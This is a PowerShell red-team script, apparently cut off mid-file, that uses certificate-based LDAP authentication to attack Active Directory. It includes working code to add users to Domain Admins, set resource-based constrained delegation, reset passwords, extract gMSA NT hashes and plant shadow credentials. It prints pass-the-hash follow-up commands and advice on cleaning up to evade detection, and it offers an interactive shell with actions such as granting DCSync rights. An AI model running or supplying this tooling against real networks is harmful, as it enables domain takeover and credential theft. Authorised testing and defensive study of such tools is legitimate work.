<#
.SYNOPSIS
    Native PassTheCert - LDAP operations using certificate authentication.
.DESCRIPTION
    Authenticates to LDAP/LDAPS using a PFX certificate and performs privileged
    operations as the certificate's mapped identity. Pure LOLBAS - no external tools.

    Tries multiple auth methods: LDAPS EXTERNAL, StartTLS EXTERNAL, LDAPS Negotiate.
.PARAMETER PFXFile
    Path to the PFX certificate file
.PARAMETER PFXPassword
    PFX file password
.PARAMETER DCTarget
    Domain Controller FQDN (auto-detected if omitted)
.PARAMETER Action
    Operation to perform after authentication:
      Whoami         - Verify authenticated identity
      AddGroupMember - Add a principal to a group
      SetRBCD        - Set Resource-Based Constrained Delegation
      ResetPassword  - Reset a user's password
      ReadGMSA       - Read gMSA managed password and compute NT hash
      ShadowCred     - Add shadow credential to target (msDS-KeyCredentialLink)
      LdapShell      - Interactive LDAP query mode
.PARAMETER TargetDN
    Distinguished Name of the target object (group DN, computer DN, user DN)
.PARAMETER PrincipalDN
    Distinguished Name of the principal to add (for AddGroupMember, SetRBCD)
.PARAMETER PrincipalSID
    SID of the principal (for SetRBCD, auto-resolved from PrincipalDN if omitted)
.PARAMETER NewPassword
    New password for ResetPassword action
.EXAMPLE
    .\Invoke-PassTheCert.ps1 -PFXFile esc1.pfx -PFXPassword "pass" -Action Whoami -DCTarget polaris.zsec.red
.EXAMPLE
    .\Invoke-PassTheCert.ps1 -PFXFile esc1.pfx -PFXPassword "pass" -Action AddGroupMember -TargetDN "CN=Domain Admins,CN=Users,DC=zsec,DC=red" -PrincipalDN "CN=jsmith,CN=Users,DC=zsec,DC=red" -DCTarget polaris.zsec.red
.EXAMPLE
    .\Invoke-PassTheCert.ps1 -PFXFile esc1.pfx -PFXPassword "pass" -Action SetRBCD -TargetDN "CN=POLARIS,OU=Domain Controllers,DC=zsec,DC=red" -PrincipalDN "CN=ATTACKER$,CN=Computers,DC=zsec,DC=red" -DCTarget polaris.zsec.red
.EXAMPLE
    .\Invoke-PassTheCert.ps1 -PFXFile esc1.pfx -PFXPassword "pass" -Action ShadowCred -TargetDN "POLARIS$" -DCTarget polaris.zsec.red
.EXAMPLE
    .\Invoke-PassTheCert.ps1 -PFXFile esc1.pfx -PFXPassword "pass" -Action LdapShell -DCTarget polaris.zsec.red
.NOTES
    For authorised security testing and educational purposes only.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$PFXFile,
    [Parameter(Mandatory)] [string]$PFXPassword,

    [ValidateSet('Whoami','AddGroupMember','SetRBCD','ResetPassword','ReadGMSA','ShadowCred','LdapShell')]
    [string]$Action = 'Whoami',

    [string]$DCTarget,
    [string]$TargetDN,
    [string]$PrincipalDN,
    [string]$PrincipalSID,
    [string]$NewPassword
)

$ErrorActionPreference = 'Stop'

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

# ============================================================================
#  GMSA / NT Hash helpers (BCrypt MD4 via P/Invoke)
# ============================================================================

try { [BCryptMD4] | Out-Null } catch {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class BCryptMD4 {
    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    static extern int BCryptOpenAlgorithmProvider(
        out IntPtr hAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);

    [DllImport("bcrypt.dll")]
    static extern int BCryptHash(
        IntPtr hAlgorithm, IntPtr pbSecret, int cbSecret,
        byte[] pbInput, int cbInput, byte[] pbOutput, int cbOutput);

    public static byte[] ComputeMD4(byte[] input) {
        IntPtr hAlg;
        BCryptOpenAlgorithmProvider(out hAlg, "MD4", null, 0);
        byte[] hash = new byte[16];
        BCryptHash(hAlg, IntPtr.Zero, 0, input, input.Length, hash, 16);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return hash;
    }
}
'@
}

function Parse-GMSAPasswordBlob {
    param([byte[]]$Blob)
    # MSDS-MANAGEDPASSWORD_BLOB structure
    $version       = [BitConverter]::ToUInt16($Blob, 0)
    $curPwdOffset  = [BitConverter]::ToUInt16($Blob, 8)
    $prevPwdOffset = [BitConverter]::ToUInt16($Blob, 10)
    $queryIntOff   = [BitConverter]::ToUInt16($Blob, 12)
    # Current password bytes
    $pwdEnd = if ($prevPwdOffset -ne 0) { $prevPwdOffset } else { $queryIntOff }
    $pwdLen = $pwdEnd - $curPwdOffset
    $pwdBytes = New-Object byte[] $pwdLen
    [Array]::Copy($Blob, $curPwdOffset, $pwdBytes, 0, $pwdLen)
    # NT hash = MD4(raw password bytes)
    $ntHash = [BCryptMD4]::ComputeMD4($pwdBytes)
    $ntHashHex = ($ntHash | ForEach-Object { $_.ToString("x2") }) -join ''
    return @{
        Version       = $version
        PasswordLen   = $pwdLen
        NTHash        = $ntHashHex
        PasswordBytes = $pwdBytes
    }
}

# ============================================================================
#  SHADOW CREDENTIALS - KeyCredential blob builder (MS-ADTS 2.2.20)
# ============================================================================

function New-ShadowCredential {
    <# Generates an RSA key pair, builds a KeyCredential blob per MS-ADTS 2.2.20,
       writes it to msDS-KeyCredentialLink, and exports a PFX for PKINIT auth. #>
    param(
        [string]$TargetDN,
        [System.DirectoryServices.Protocols.LdapConnection]$Connection,
        [string]$OutDir = "$env:TEMP\adcs-ops",
        [string]$Indent = "  "
    )

    if (-not (Test-Path $OutDir)) { New-Item -ItemType Directory -Path $OutDir -Force | Out-Null }

    # Generate self-signed cert with RSA 2048 (Client Auth EKU for PKINIT)
    Write-Host "$Indent[>] Generating RSA 2048 key pair + self-signed certificate..." -ForegroundColor Gray
    try {
        $certParams = @{
            Subject            = "CN=ShadowCred"
            CertStoreLocation  = "Cert:\CurrentUser\My"
            KeyExportPolicy    = "Exportable"
            KeyLength          = 2048
            KeyAlgorithm       = "RSA"
            HashAlgorithm      = "SHA256"
            NotAfter           = (Get-Date).AddYears(2)
            KeySpec            = "KeyExchange"
            TextExtension      = @("2.5.29.37={text}1.3.6.1.5.5.7.3.2")
        }
        $cert = New-SelfSignedCertificate @certParams
    } catch {
        Write-Host "$Indent[-] New-SelfSignedCertificate failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "$Indent[i] Requires Windows 10 / Server 2016+ with PKI module" -ForegroundColor Yellow
        return $null
    }

    # Export PFX for later PKINIT use
    $pfxPass = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
    $ts = Get-Date -Format 'yyyyMMdd-HHmmss'
    $pfxPath = "$OutDir\shadowcred-$ts.pfx"
    $pfxBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, $pfxPass)
    [System.IO.File]::WriteAllBytes($pfxPath, $pfxBytes)

    # Extract RSA public key parameters
    $rsaKey = $cert.PublicKey.Key
    $rsaParams = $rsaKey.ExportParameters($false)

    # ---- Build BCRYPT_RSAKEY_BLOB (RSA public key) ----
    $ms = New-Object System.IO.MemoryStream
    $bw = New-Object System.IO.BinaryWriter($ms)
    $bw.Write([uint32]0x31415352)                          # Magic: RSA1
    $bw.Write([uint32]($rsaParams.Modulus.Length * 8))      # BitLength
    $bw.Write([uint32]$rsaParams.Exponent.Length)           # cbPublicExp
    $bw.Write([uint32]$rsaParams.Modulus.Length)             # cbModulus
    $bw.Write([uint32]0)                                    # cbPrime1
    $bw.Write([uint32]0)                                    # cbPrime2
    $bw.Write($rsaParams.Exponent)
    $bw.Write($rsaParams.Modulus)
    $bw.Flush()
    $keyMaterial = $ms.ToArray()
    $bw.Dispose(); $ms.Dispose()

    # KeyID = SHA256(KeyMaterial)
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $keyId = $sha.ComputeHash($keyMaterial)

    # Timestamps and DeviceId
    $nowFT = [BitConverter]::GetBytes([long][DateTime]::UtcNow.ToFileTimeUtc())
    $devId = [guid]::NewGuid().ToByteArray()

    # ---- Build all entries (except KeyHash) for hash computation ----
    $eMs = New-Object System.IO.MemoryStream
    $eBw = New-Object System.IO.BinaryWriter($eMs)
    # KeyID (0x0001)
    $eBw.Write([uint16]0x0001); $eBw.Write([uint32]$keyId.Length); $eBw.Write($keyId)
    # KeyMaterial (0x0003)
    $eBw.Write([uint16]0x0003); $eBw.Write([uint32]$keyMaterial.Length); $eBw.Write($keyMaterial)
    # KeyUsage (0x0004) = NGC
    $eBw.Write([uint16]0x0004); $eBw.Write([uint32]1); $eBw.Write([byte]0x01)
    # KeySource (0x0005) = AD
    $eBw.Write([uint16]0x0005); $eBw.Write([uint32]1); $eBw.Write([byte]0x00)
    # DeviceId (0x0006)
    $eBw.Write([uint16]0x0006); $eBw.Write([uint32]$devId.Length); $eBw.Write($devId)
    # CustomKeyInformation (0x0007)
    $eBw.Write([uint16]0x0007); $eBw.Write([uint32]2); $eBw.Write([byte]0x01); $eBw.Write([byte]0x00)
    # KeyApproximateLastLogonTimeStamp (0x0008)
    $eBw.Write([uint16]0x0008); $eBw.Write([uint32]$nowFT.Length); $eBw.Write($nowFT)
    # CreationTime (0x0009)
    $eBw.Write([uint16]0x0009); $eBw.Write([uint32]$nowFT.Length); $eBw.Write($nowFT)
    $eBw.Flush()
    $entriesData = $eMs.ToArray()
    $eBw.Dispose(); $eMs.Dispose()

    # KeyHash = SHA256(Version + all entries except KeyHash)
    $hMs = New-Object System.IO.MemoryStream
    $hMs.Write([BitConverter]::GetBytes([uint32]0x200), 0, 4)
    $hMs.Write($entriesData, 0, $entriesData.Length)
    $keyHash = $sha.ComputeHash($hMs.ToArray())
    $hMs.Dispose()
    $sha.Dispose()

    # ---- Assemble final blob: Version + all entries with KeyHash ----
    $fMs = New-Object System.IO.MemoryStream
    $fBw = New-Object System.IO.BinaryWriter($fMs)
    $fBw.Write([uint32]0x200)  # Version
    $fBw.Write([uint16]0x0001); $fBw.Write([uint32]$keyId.Length); $fBw.Write($keyId)
    $fBw.Write([uint16]0x0002); $fBw.Write([uint32]$keyHash.Length); $fBw.Write($keyHash)
    $fBw.Write([uint16]0x0003); $fBw.Write([uint32]$keyMaterial.Length); $fBw.Write($keyMaterial)
    $fBw.Write([uint16]0x0004); $fBw.Write([uint32]1); $fBw.Write([byte]0x01)
    $fBw.Write([uint16]0x0005); $fBw.Write([uint32]1); $fBw.Write([byte]0x00)
    $fBw.Write([uint16]0x0006); $fBw.Write([uint32]$devId.Length); $fBw.Write($devId)
    $fBw.Write([uint16]0x0007); $fBw.Write([uint32]2); $fBw.Write([byte]0x01); $fBw.Write([byte]0x00)
    $fBw.Write([uint16]0x0008); $fBw.Write([uint32]$nowFT.Length); $fBw.Write($nowFT)
    $fBw.Write([uint16]0x0009); $fBw.Write([uint32]$nowFT.Length); $fBw.Write($nowFT)
    $fBw.Flush()
    $blob = $fMs.ToArray()
    $fBw.Dispose(); $fMs.Dispose()

    # Format as DN-Binary value for msDS-KeyCredentialLink
    $hex = ($blob | ForEach-Object { $_.ToString("X2") }) -join ''
    $dnBinary = "B:$($hex.Length):${hex}:$TargetDN"

    # Write to target via LDAP (Add, not Replace - preserves existing creds)
    Write-Host "$Indent[>] Writing msDS-KeyCredentialLink on target..." -ForegroundColor Gray
    $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
        $TargetDN,
        [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
        "msDS-KeyCredentialLink",
        $dnBinary
    )
    $Connection.SendRequest($mod) | Out-Null

    # Remove temp cert from local store
    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My", "CurrentUser")
    $store.Open("ReadWrite")
    $store.Remove($cert)
    $store.Close()

    $devGuid = [guid]::new($devId)
    Write-Host "$Indent[+] Shadow credential added successfully" -ForegroundColor Green
    Write-Host "$Indent[i] DeviceId  : $devGuid" -ForegroundColor Gray
    Write-Host "$Indent[i] PFX File  : $pfxPath" -ForegroundColor Cyan
    Write-Host "$Indent[i] PFX Pass  : $pfxPass" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "$Indent[i] Authenticate with PKINIT:" -ForegroundColor Gray
    Write-Host "$Indent[i]   Rubeus  : Rubeus.exe asktgt /user:<target> /certificate:`"$pfxPath`" /password:`"$pfxPass`" /ptt" -ForegroundColor Gray
    Write-Host "$Indent[i]   certipy : certipy auth -pfx shadowcred-$ts.pfx -dc-ip <DC>" -ForegroundColor Gray
    Write-Host "$Indent[i]   PTC     : .\Invoke-PassTheCert.ps1 -PFXFile `"$pfxPath`" -PFXPassword `"$pfxPass`" -Action LdapShell" -ForegroundColor Gray
    Write-Host ""
    Write-Host "$Indent--- OPSEC: Cleanup After Use ---" -ForegroundColor Yellow
    Write-Host "$Indent[i] Remove credential when done to avoid detection:" -ForegroundColor DarkGray
    Write-Host "$Indent[i]   LdapShell : clearcred <target>" -ForegroundColor Gray
    Write-Host "$Indent[i]   Standalone: .\Invoke-ShadowCredentials.ps1 -Target <target> -Action Remove -DeviceId `"$devGuid`"" -ForegroundColor Gray

    return @{
        PFXFile     = $pfxPath
        PFXPassword = $pfxPass
        DeviceId    = $devGuid
    }
}

Write-Host ""
Write-Host "  AD CS LOLBAS - PassTheCert (Native)" -ForegroundColor White
Write-Host "  --------------------------------------" -ForegroundColor DarkGray
Write-Host ""

# ============================================================================
#  Load certificate and connect
# ============================================================================

if (-not (Test-Path $PFXFile)) {
    Write-Host "  [-] PFX file not found: $PFXFile" -ForegroundColor Red
    exit 1
}

Write-Host "  [>] Loading PFX: $PFXFile" -ForegroundColor Gray
$pfxCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$pfxCert.Import($PFXFile, $PFXPassword, [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::UserKeySet)
Write-Host "  [i] Subject    : $($pfxCert.Subject)" -ForegroundColor Gray
Write-Host "  [i] Issuer     : $($pfxCert.Issuer)" -ForegroundColor Gray
Write-Host "  [i] Thumbprint : $($pfxCert.Thumbprint)" -ForegroundColor Gray

$sanExt = $pfxCert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
if ($sanExt) {
    Write-Host "  [i] SAN        : $($sanExt.Format($false))" -ForegroundColor Cyan
}

$dc = if ($DCTarget) { $DCTarget } else { Get-DCTarget }

Write-Host ""
$ldap = Connect-CertAuth -Certificate $pfxCert -DC $dc -Indent "  "

if (-not $ldap) {
    Write-Host ""
    Write-Host "  [-] All authentication methods failed" -ForegroundColor Red
    Write-Host "  [i] Use Rubeus: Rubeus.exe asktgt /certificate:`"$PFXFile`" /password:`"$PFXPassword`" /ptt" -ForegroundColor Cyan
    exit 1
}

$identity = Test-CertIdentity -Connection $ldap -Indent "  "

if (-not $identity -and $Action -ne 'Whoami') {
    Write-Host "  [!] No identity mapped - operations will likely fail" -ForegroundColor Yellow
    Write-Host "  [i] Use Rubeus for PKINIT instead" -ForegroundColor Cyan
}

if ($Action -eq 'Whoami') {
    Write-Host ""
    Write-Host "  Complete." -ForegroundColor Gray
    $ldap.Dispose()
    exit 0
}

# ============================================================================
#  ACTIONS
# ============================================================================

$ctx = Get-ADContext

switch ($Action) {

    'AddGroupMember' {
        if (-not $TargetDN -or -not $PrincipalDN) {
            Write-Host "  [-] Required: -TargetDN (group DN) -PrincipalDN (member DN)" -ForegroundColor Red
            exit 1
        }
        Write-Host ""
        Write-Host "  [>] Adding member to group" -ForegroundColor Yellow
        Write-Host "  [i] Group  : $TargetDN" -ForegroundColor Gray
        Write-Host "  [i] Member : $PrincipalDN" -ForegroundColor Gray

        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $TargetDN,
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add,
            "member",
            $PrincipalDN
        )
        try {
            $ldap.SendRequest($mod) | Out-Null
            Write-Host "  [+] Member added successfully" -ForegroundColor Green
        } catch {
            Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    'SetRBCD' {
        if (-not $TargetDN -or -not $PrincipalDN) {
            Write-Host "  [-] Required: -TargetDN (computer DN) -PrincipalDN (attacker account DN)" -ForegroundColor Red
            exit 1
        }
        Write-Host ""
        Write-Host "  [>] Setting Resource-Based Constrained Delegation" -ForegroundColor Yellow
        Write-Host "  [i] Target    : $TargetDN" -ForegroundColor Gray
        Write-Host "  [i] Principal : $PrincipalDN" -ForegroundColor Gray

        # Resolve principal SID
        $sid = $PrincipalSID
        if (-not $sid) {
            Write-Host "  [>] Resolving principal SID..." -ForegroundColor Gray
            $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                $PrincipalDN, "(objectClass=*)", "Base", @("objectSid")
            )
            $searchResp = $ldap.SendRequest($searchReq)
            if ($searchResp.Entries.Count -gt 0) {
                $sidBytes = $searchResp.Entries[0].Attributes["objectSid"][0]
                $sidObj = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
                $sid = $sidObj.Value
                Write-Host "  [i] SID: $sid" -ForegroundColor Gray
            } else {
                Write-Host "  [-] Could not resolve principal SID" -ForegroundColor Red
                exit 1
            }
        }

        # Build security descriptor granting the principal S4U2Proxy rights
        $rawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)")
        $sdBytes = New-Object byte[] $rawSD.BinaryLength
        $rawSD.GetBinaryForm($sdBytes, 0)

        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $TargetDN,
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
            "msDS-AllowedToActOnBehalfOfOtherIdentity",
            $sdBytes
        )
        try {
            $ldap.SendRequest($mod) | Out-Null
            Write-Host "  [+] RBCD configured successfully" -ForegroundColor Green
            Write-Host "  [i] $PrincipalDN can now impersonate users to $TargetDN" -ForegroundColor Cyan
            Write-Host "  [i] Next: getST.py or Rubeus s4u to get service ticket" -ForegroundColor Cyan
        } catch {
            Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    'ResetPassword' {
        if (-not $TargetDN) {
            Write-Host "  [-] Required: -TargetDN (user DN)" -ForegroundColor Red
            exit 1
        }
        if (-not $NewPassword) {
            $NewPassword = -join ((48..57) + (65..90) + (97..122) + (33,35,36,37,38,42) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
            Write-Host "  [i] Generated password: $NewPassword" -ForegroundColor Cyan
        }
        Write-Host ""
        Write-Host "  [>] Resetting password via LDAP" -ForegroundColor Yellow
        Write-Host "  [i] Target : $TargetDN" -ForegroundColor Gray

        # LDAP password reset uses unicodePwd with quoted UTF-16LE password
        $quotedPwd = [System.Text.Encoding]::Unicode.GetBytes("`"$NewPassword`"")

        $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest(
            $TargetDN,
            [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
            "unicodePwd",
            $quotedPwd
        )
        try {
            $ldap.SendRequest($mod) | Out-Null
            Write-Host "  [+] Password reset successfully" -ForegroundColor Green
            Write-Host "  [i] New password: $NewPassword" -ForegroundColor Cyan
        } catch {
            Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "  [i] Password reset requires Reset Password permission on the target" -ForegroundColor Yellow
        }
    }

    'ReadGMSA' {
        if (-not $TargetDN) {
            Write-Host "  [-] Required: -TargetDN (gMSA account DN or sAMAccountName)" -ForegroundColor Red
            Write-Host "  [i] Find gMSAs: (objectClass=msDS-GroupManagedServiceAccount)" -ForegroundColor Cyan
            exit 1
        }
        Write-Host ""
        Write-Host "  [>] Reading gMSA managed password" -ForegroundColor Yellow

        # Resolve DN if sAMAccountName was given
        $gmsaDN = $TargetDN
        if ($TargetDN -notmatch ',') {
            Write-Host "  [>] Resolving sAMAccountName: $TargetDN" -ForegroundColor Gray
            $findReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                $ctx.DomainDN,
                "(&(objectClass=msDS-GroupManagedServiceAccount)(sAMAccountName=$TargetDN))",
                "Subtree", @("distinguishedName")
            )
            $findReq.SizeLimit = 1
            $findResp = $ldap.SendRequest($findReq)
            if ($findResp.Entries.Count -eq 0) {
                Write-Host "  [-] gMSA not found: $TargetDN" -ForegroundColor Red
                exit 1
            }
            $gmsaDN = $findResp.Entries[0].DistinguishedName
        }
        Write-Host "  [i] Target : $gmsaDN" -ForegroundColor Gray

        $searchReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
            $gmsaDN, "(objectClass=*)", "Base",
            @("sAMAccountName", "msDS-ManagedPassword", "msDS-ManagedPasswordInterval")
        )
        try {
            $resp = $ldap.SendRequest($searchReq)
            if ($resp.Entries.Count -eq 0) {
                Write-Host "  [-] Object not found: $gmsaDN" -ForegroundColor Red
                exit 1
            }
            $entry = $resp.Entries[0]
            $sam = if ($entry.Attributes["sAMAccountName"]) { $entry.Attributes["sAMAccountName"][0] } else { "?" }
            Write-Host "  [i] Account: $sam" -ForegroundColor Gray

            if (-not $entry.Attributes["msDS-ManagedPassword"]) {
                Write-Host "  [-] msDS-ManagedPassword not returned" -ForegroundColor Red
                Write-Host "  [i] Your identity must be in PrincipalsAllowedToRetrieveManagedPassword" -ForegroundColor Yellow
                exit 1
            }

            $blob = [byte[]]$entry.Attributes["msDS-ManagedPassword"][0]
            $parsed = Parse-GMSAPasswordBlob -Blob $blob

            Write-Host "  [+] gMSA password blob retrieved ($($parsed.PasswordLen) bytes)" -ForegroundColor Green
            Write-Host "  [+] NT Hash: $($parsed.NTHash)" -ForegroundColor Cyan
            Write-Host ""
            Write-Host "  [i] Pass-the-Hash:" -ForegroundColor Gray
            Write-Host "  [i]   impacket-psexec '$sam@<target>' -hashes :$($parsed.NTHash)" -ForegroundColor Gray
            Write-Host "  [i]   evil-winrm -i <target> -u '$sam' -H $($parsed.NTHash)" -ForegroundColor Gray
            Write-Host "  [i]   crackmapexec smb <target> -u '$sam' -H $($parsed.NTHash)" -ForegroundColor Gray
        } catch {
            Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "  [i] Ensure your identity can read msDS-ManagedPassword" -ForegroundColor Yellow
        }
    }

    'ShadowCred' {
        if (-not $TargetDN) {
            Write-Host "  [-] Required: -TargetDN (target user/computer DN or sAMAccountName)" -ForegroundColor Red
            exit 1
        }
        Write-Host ""
        Write-Host "  [>] Shadow Credentials Attack (native)" -ForegroundColor Yellow

        # Resolve DN if sAMAccountName
        $scDN = $TargetDN
        if ($TargetDN -notmatch ',') {
            Write-Host "  [>] Resolving sAMAccountName: $TargetDN" -ForegroundColor Gray
            $findReq = New-Object System.DirectoryServices.Protocols.SearchRequest(
                $ctx.DomainDN, "(sAMAccountName=$TargetDN)", "Subtree", @("distinguishedName")
            )
            $findReq.SizeLimit = 1
            $findResp = $ldap.SendRequest($findReq)
            if ($findResp.Entries.Count -eq 0) {
                Write-Host "  [-] Not found: $TargetDN" -ForegroundColor Red
                exit 1
            }
            $scDN = $findResp.Entries[0].DistinguishedName
        }
        Write-Host "  [i] Target: $scDN" -ForegroundColor Gray

        try {
            $result = New-ShadowCredential -TargetDN $scDN -Connection $ldap -OutDir "$env:TEMP\adcs-ops"
            if (-not $result) { exit 1 }
        } catch {
            Write-Host "  [-] Failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "  [i] Requires WriteProperty on msDS-KeyCredentialLink for the target" -ForegroundColor Yellow
        }
    }

    'LdapShell' {
        Write-Host ""
        Write-Host "  [>] LDAP Shell - Interactive LDAP query console" -ForegroundColor Yellow
        Write-Host "  [i] Base DN: $($ctx.DomainDN)" -ForegroundColor Gray
        Write-Host ""
        Write-Host "  Enumeration:" -ForegroundColor DarkCyan
        Write-Host "    whoami                     Show current identity" -ForegroundColor Gray
        Write-Host "    user / group / computer    Find object by name" -ForegroundColor Gray
        Write-Host "    users / groups / computers List all (active)" -ForegroundColor Gray
        Write-Host "    memberof <user>            Groups a user belongs to" -ForegroundColor Gray
        Write-Host "    admins / das / eas / dcs   Admin accounts, DA/EA/DC groups" -ForegroundColor Gray
        Write-Host "    spns / asrep               Kerberoast / AS-REP targets" -ForegroundColor Gray
        Write-Host "    kerberoast [SPN]           List targets or request TGS" -ForegroundColor Gray
        Write-Host "    asreproast [user]          List targets or roast user" -ForegroundColor Gray
        Write-Host "    delegations                All delegation types summary" -ForegroundColor Gray
        Write-Host "    unconstrained/constrained  Specific delegation type" -ForegroundColor Gray
        Write-Host "    rbcd <computer>            RBCD config on computer" -ForegroundColor Gray
        Write-Host "    gmsa [account]             List/read gMSA passwords" -ForegroundColor Gray
        Write-Host "    laps <computer>            Read LAPS password" -ForegroundColor Gray
        Write-Host "    dacl / acl <tgt> [id]      DACL dump / filtered ACL check" -ForegroundColor Gray
        Write-Host "    owner <target>             Show object owner" -ForegroundColor Gray
        Write-Host "    sid <SID>                  Resolve SID to object" -ForegroundColor Gray
        Write-Host "    search <term>              Free-text search (name/desc)" -ForegroundColor Gray
        Write-Host "    domaininfo                 Domain overview + SID + func level" -ForegroundColor Gray
        Write-Host "    lastlogon <user>           Logon timestamps + pwd info" -ForegroundColor Gray
        Write-Host "    lockout                    Currently locked-out accounts" -ForegroundColor Gray
        Write-Host "    adminsd                    AdminSDHolder protected users" -ForegroundColor Gray
        Write-Host "    maq / pwdpolicy / fgpp     Quota / password policies" -ForegroundColor Gray
        Write-Host "    sql / web / exchange       Service-specific SPNs" -ForegroundColor Gray
        Write-Host "    sccm / rodc                SCCM servers / Read-Only DCs" -ForegroundColor Gray
        Write-Host "    servicemap                 SPN service type breakdown" -ForegroundColor Gray
        Write-Host "    gpolinks                   GPO links on OUs" -ForegroundColor Gray
        Write-Host "    trusts / subnets / sites   Domain trusts / subnets / sites" -ForegroundColor Gray
        Write-Host "    gpos / ous / foreigners    GPOs / OUs / foreign principals" -ForegroundColor Gray
        Write-Host "    desc / stale               Users w/ descriptions / stale PCs" -ForegroundColor Gray
        Write-Host "    neverexpire / passnotreqd  Weak password policy accounts" -ForegroundColor Gray
        Write-Host "    disabled / protected       Disabled / Protected Users" -ForegroundColor Gray
        Write-Host "    pre2k                      Pre-Win2000 group members" -ForegroundColor Gray
        Write-Host "    templates / cas            Cert templates / CAs" -ForegroundColor Gray
        Write-Host "    enrollcheck <template>     Enrollment ACLs + ESC analysis" -ForegroundColor Gray
        Write-Host "    dnszones / dnsrecords      ADIDNS zones / records" -ForegroundColor Gray
        Write-Host "    dn <dn>                    All attributes of a DN" -ForegroundColor Gray
        Write-Host "    (raw LDAP filter)          e.g. (objectClass=user)" -ForegroundColor Gray
        Write-Host ""
        Write-Host "  Actions:" -ForegroundColor DarkCyan
        Write-Host "    adduser <name> [pass]      Create domain user" -ForegroundColor Gray
        Write-Host "    addda <name> [pass]        Create user + Domain Admin" -ForegroundColor Gray
        Write-Host "    addcomputer <name> [pass]  Create machine account" -ForegroundColor Gray
        Write-Host "    deluser <target>           Delete user/computer" -ForegroundColor Gray
        Write-Host "    passwd <user> [pass]       Reset password" -ForegroundColor Gray
        Write-Host "    addmember <grp> <user>     Add to group" -ForegroundColor Gray
        Write-Host "    delmember <grp> <user>     Remove from group" -ForegroundColor Gray
        Write-Host "    shadowcred <target>        Add shadow credential" -ForegroundColor Gray
        Write-Host "    clearcred <target>         Clear key credentials" -ForegroundColor Gray
        Write-Host "    setrbcd <tgt> <princ>      Set RBCD" -ForegroundColor Gray
        Write-Host "    delrbcd <target>           Clear RBCD" -ForegroundColor Gray
        Write-Host "    setdcsync <principal>      Grant DCSync rights" -ForegroundColor Gray
        Write-Host "    addspn <acct> <spn>        Add SPN (kerberoast)" -ForegroundColor Gray
        Write-Host "    delspn <acct> <spn>        Remove SPN" -ForegroundColor Gray
        Write-Host "    setasrep <account>         Enable AS-REP roasting" -ForegroundColor Gray
        Write-Host "    setowner <tgt> <princ>     Change object owner" -ForegroundColor Gray
        Write-Host "    writedacl <tgt> <princ> <right>  Add ACE" -ForegroundColor Gray
        Write-Host "    disable / enable <acct>    Toggle account state" -ForegroundColor Gray
        Write-Host "    dnsadd <name> <IP>         Add ADIDNS A record" -ForegroundColor Gray
        Write-Host "    dnsdel <name>              Delete DNS record" -ForegroundColor Gray
        Write-Host "    setattr <DN> <attr> <val>  Set LDAP attribute" -ForegroundColor Gray
        Write-Host ""
        Write-Host "  OPSEC:" -ForegroundColor DarkCyan
        Write-Host "    delay [ms] [jitter%]       Set query delay (e.g., delay 1000 50)" -ForegroundColor Gray
        Write-Host "    cleanup                    Remove temp artifacts from disk" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    help / quit / exit" -ForegroundColor Gray
        Write-Host ""

        $defaultAttrs = @("sAMAccountName", "distinguishedName", "memberOf", "userPrincipalName", "description", "objectClass")

        # Well-known AD extended rights / property GUIDs
        $guidMap = @{
            '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' = 'Repl-Get-Changes'
            '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' = 'Repl-Get-Changes-All'
            '89e95b76-444d-4c62-991a-0facbeda640c' = 'Repl-Get-Changes-Filter'
            '00299570-246d-11d0-a768-00aa006e0529' = 'Reset-Password'
            'ab721a53-1e2f-11d0-9819-00aa0040529b' = 'Change-Password'
            '5b47d60f-6090-40b2-9f37-2a4de88f3063' = 'Key-Credential-Link'
            'f3a64788-5306-11d1-a9c5-0000f80367c1' = 'SPN'
            'bf9679c0-0de6-11d0-a285-00aa003049e2' = 'Member'
            '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' = 'AllowedToActOnBehalf'
            '0e10c968-78fb-11d2-90d4-00c04f79dc55' = 'Certificate-Enrollment'
            'a05b8cc2-17bc-4802-a710-e7c15ab866a2' = 'Certificate-AutoEnrollment'
